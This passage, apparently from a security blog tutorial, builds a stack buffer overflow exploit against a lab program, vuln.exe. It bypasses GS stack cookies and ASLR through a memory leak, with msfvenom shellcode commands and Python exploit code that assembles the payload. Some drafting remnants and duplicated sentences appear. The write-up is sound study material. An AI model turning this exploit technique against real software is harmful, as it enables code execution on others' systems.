We need to overwrite the saved return address on the stack with a reliable address that points to an area of memory we control.  One of the requirements for this is having at least one of the registers point to the contents of our payload in memory represented by `0x44444444...` ("DDDD").  This is where we will store our shellcode.

{% comment %}
The next objective is to locate the malicious payload represented by `0x44444444...` ("DDDD").  We'll overwrite the saved return address with one of the registers that point to the contents of our payload in memory.
{% endcomment %}

At the time of the program crash, the stack pointer points to the beginning of our malicious payload.  Looking at the stack pointer `0x008ff82c` in WinDbg memory view confirms that it points to the first `0x44` byte of the payload following the EIP overwrite.  

<a href="{{ site.baseurl }}/images/windbg-mem.PNG">
<img class="img-center" src="{{ site.baseurl }}/images/windbg-mem.PNG">
</a>

To execute the shellcode, we need to point the instruction pointer `eip` at this address / location.  This can be achieved by overwriting `eip` with the address of the stack pointer or with an address of `jmp esp`.  (I've tried the exploit both ways with success.)

Leveraging the memory leak again, we can find an exact return address by comparing the output of

We can leverage the memory leak vulnerability again to find an exact return address by comparing the output of `memleak()` with the addresses in the stack frame at the time of the crash.  Eventually, I noticed that the tenth address printed by `memleak()` was the same address as the stack pointer at the time of the EIP overwrite and crash in `overflow()`.

Below shows this comparison.  The top screen shows the state of the registers in WinDbg at the time the program crashes and the lower console shows the output from `memleak()` with the tenth address circled.

<p class="txt-blue-1">Test Sample Text</p>
<p class="txt-blue-2">Test Sample Text</p>
<p style="color: #C188E0;">Test Sample Text</p>

<a href="{{ site.baseurl }}/images/returnaddress.png">
<img class="img-center" src="{{ site.baseurl }}/images/returnaddress.png">
</a>

Because the stack pointer always prints as the tenth address in the memory leak, we have a permanent solution to obtain the stack address for the EIP overwrite despite ASLR and other mitigations.

After overwriting the saved return address with the location of the stack pointer, the first instruction to execute will be a byte `0x90` from our NOP sled.  We'll prepend a generous NOP sled so the decoder has extra space to work when decoding the shellcode.  Eventually program execution will slide through the NOP's until it hits a set of executable instructions from our shellcode.  

To show the transfer from the NOPS to shellcode, I inserted an int3 interrupt to break at the end of the NOP sled where we anticipate execution to be redirected.  This is shown in the disassembly in Figure \ref{transfer} with the current Instruction Pointer in the debugger highlighted in dark gray and black.  With the breakpoint placed at this location, it's confirmed that redirection is occurring as expected.  Without this breakpoint, the Instruction Pointer will slide right into the first executable instruction of our malicious code.

### Generate Shellcode with msfvenom

The last thing we need to complete the exploit is shellcode.  In my exploit I'll launch a simple POP calc shellcode.

The command line tool `msfvenom` generates payloads on the fly.  It comes installed with Metasploit Framework and combines the msfpayload and msfencode tools from older versions of MSF.  In my experience, it quickly generates reliable shellcode for a variety of systems.  This section provides a short `msfvenom` primer, so feel free to [skip] if you are already familiar.

[skip]: #results "skip to next section"

The basic syntax to generate a payload requires at minimum two arguments (-p and -f):

```
$ msfvenom -p [payload] OPTION=value .... -f [output format]
```

* **-p [payload]** sets the payload to generate.  In this exploit, I use the "windows/exec" payload that executes an arbitrary command ("windows/x64/exec" is the x64 version).
     To see what payloads are available from Framework:
  - `msfvenom -l payloads | grep windows` lists all payloads and greps for Windows payloads only.
  - `msfvenom -p [payload] --list-options` lists the options that we need to set for each payload.  To use windows/exec, there are two basic options that must be specified by the user.  Default values under Current Settings can be accepted by leaving the option out of the command.
  ```
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  CMD                        yes       The command string to execute
  EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
  ```
* **-f [format]** specifies the output format.  If not specified, `msfvenom` will output the payload in raw bytes.
  - `msfvenom -l formats` lists supported formats.
  - There are two types of formats: Executable and Transform.  The former saves the shellcode as an application and the latter will output shellcode to the screen that is ready to be copy and pasted in the language of your exploit / language your exploit is written in.
    - For instance, `-f python` outputs the payload in python format:
    ```
    buf =  ""
    buf += "\xdb\xc5\xb8\xb5\x95\xa8\x9c\xd9\x74\x24\xf4\x5f\x29"
    buf += "\xc9\xb1\x31\x83\xc7\x04\x31\x47\x14\x03\x47\xa1\x77"
    ```
    `-f c` outputs the payload in C format:
    ```
    unsigned char buf[] = "\xdb\xde\xd9\x74\x24\xf4\x5e\xb8\x8c\xc0\xba\x17\x31\xc9\xb1";
    ```
    `-f perl` outputs the payload in perl format:
    ```
    my $buf = "\xbb\x6a\xe1\xea\x51\xd9\xce" . "\xd9\x74\x24\xf4\x58\x29\xc9";
    ```
* **-h** displays information for additional arguments.

The shellcode I use in this exploit is generated with:

```
$ msfvenom -p windows/exec CMD=calc.exe -f python -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -v shellcode
```

Some of the arguments I haven't discussed yet:

* CMD=calc.exe sets the CMD variable in the payload to execute the Windows calculator program.  This value can be changed to execute Notepad.exe, CMD.exe, or anything else.
* **-e x86/shikata_ga_nai** encodes the payload using the Polymorphic XOR Additive Feedback Encoder scheme.
* **-b `\x00\x0a\x0d`** avoids the bad characters associated with null characters, new lines, and carriage returns.
* **-v shellcode** specifies a variable name to use in the python output format.

We don't need to be concerned with size constraints as there are over 900 bytes available on the stack for our payload.

# Putting it All Together

In this last section, I show how to put all these pieces together to construct the final exploit.  I'll explain this with examples of the exploit code.

## Final Exploit

Using Python's subprocess module for interprocess communication, the exploit program opens pipes to the vulnerable programs standard stream.  This automates the process of providing data through standard input and obtaining the security cookie and stack pointer address from standard output.  See comments in the code for more details on how this protocol is implemented.

Passed to the underlying CreateProcess() function. Open pipes to child's standard input/output/error streams to communicate with program during execution.

As stated earlier, I use Pythons `subprocess` module in the exploit code to interact with the vulnerable program.  This class uses the underlying Windows API function `CreateProcess()` to handle the process creation and management.
By spawning a new process from the exploit code and connecting to the process's standard stream pipes, I was able to control the pace of the program.

The Popen constructor creates a new process in the background and opens a pipe to the executed program's / process's standard input/output/error streams.

```python
p = Popen(["C:\\blog\\vuln.exe"], stdin=PIPE, stdout=PIPE, stderr=PIPE)
```

When the program starts, it will wait for an integer from STDIN in `memleak()` representing the size of a loop that leaks memory.  The instance / object `p` can be used throughout the program to send data to stdin and read data from stdout and stderr.  Below we send data to the process's stdin with a newline attached.

```python
loop = 40
p.stdin.write(str(loop) + "\n")
```

Next, `memleak()` output is read from the stdout pipe of the running process and saved in `output`

```python
output  = p.stdout.readline().rstrip()
```

In the `main` code I pass `output` to a helper function `get_memleak_values(output)` I created that returns the addresses we need to construct the exploit / to help process the values in the leaked output we need to construct the exploit.

```python
addr = get_memleak_values(output)
```

To refresh, the copy of the stack cookie is found at the 17th address and the stack pointer is at the 8th address.  In the first line, I split the output on each space into a list of addresses where `memleak[0]` contains the `printf>` prompt and `memleak[1:]` contains the leaked addresses.  Therefore, the 17th address can be accessed directly in `memleak[17]` and so on.  The function returns the addresses as a tuple.

```python
def get_memleak_values(output):
  memleak = output.split(' ')

  eax = int(memleak[17],16) # index 17 = eax (stack cookie)
  ret = int(memleak[8],16)  # index 8 = return address (esp)
  ebp = ret - 0x8

  # Output memory leak and calculated registers/values
  print "{0} {1}\n{2}".format(memleak[0], 40, ''.join(x + " " for x in memleak[1:]))
  print "[*] Leaked addresses from memleak:"
  print "eax = 0x{:>08x}".format(eax)
  print "ret = 0x{:>08x}".format(ret)
  print "cookie = 0x{:>08x}\n".format(eax^ebp)  # eax ^ ebp = cookie

  # Return addresses as a tuple
  return (eax, ret)
```

Next, the code passes the addresses returned from memleak to a helper function that crafts the exploit on the fly while vuln.exe waits for more input from STDIN in `overflow()`.

```python
payload = create_payload(addr[0], addr[1])
```

The payload generation in `create_payload(eax, ret)` works exactly as described in this post.  The fixed values in the payload that don't change are the 1024 bytes of padding in buf, the 4 byte address in ebp, the nopsled, and the shellcode.  The only dynamic values are the cookie and return address which are obtained from the running vulnerable program.

Since ebp is only used as a placeholder / for padding to get to the return address, it doesn't matter which value occupies this space.  Just as long as it's 4 bytes in size.  Another thing to point out is the length of the nop sled.  I have tested the exploit with lengths of 30 to 300 bytes with success.  This may differ system to system so it's important to test and experiment!

The shellcode in `gen_shellcode()` is pasted directly from `msfvenom`'s output thanks to its python formatting option.

```python
def create_payload(eax, ret):
  buf  = "\x41" * 1024    # buf
  buf += pack('<I', eax)  # eax = cookie
  buf += "\x42" * 4       # overwrite ebp w/ random 4-byte value
  buf += pack('<I', ret)  # overwrite eip w/ value from memleak
  buf += "\x90" * 100     # nopsled
  buf += gen_shellcode()  # shellcode
  # returns exploit payload
  return buf
```

`create_payload` returns the exploit string to `payload` and sends it to the running program through its stdin pipe with a newline appended.

```python
p.stdin.write(payload + "\n")
```

This is the end of the exploit's core functionality.  The full code with comments and a demo is posted below.

### Demo

We make the application run our shellcode which executes an arbitrary command, Calc.exe in this case which is Windows calculator app.  See below screenshot when the exploit is executed successfully.  The exploit bypasses ASLR and GS by leveraging a memory disclosure in the program to obtain the cookie and stack pointer address.

### Results

Again, we have a fully working exploit that executes our arbitrary shellcode.  With some additional work, we are still able to use our exploit from Stage 1 to overwrite the return address of `vuln()` and redirect program behavior arbitrarily.  Using the Stack Cookie bypass technique described above, we successfully overwrote the stack with the correct security cookie to pass the check and execute our shellcode completely undetected.   

Based on these results and in the presence of a memory leak vulnerability, we can say that Stack Cookie protection does not strengthen or influence CFGuard in any noticeable way.
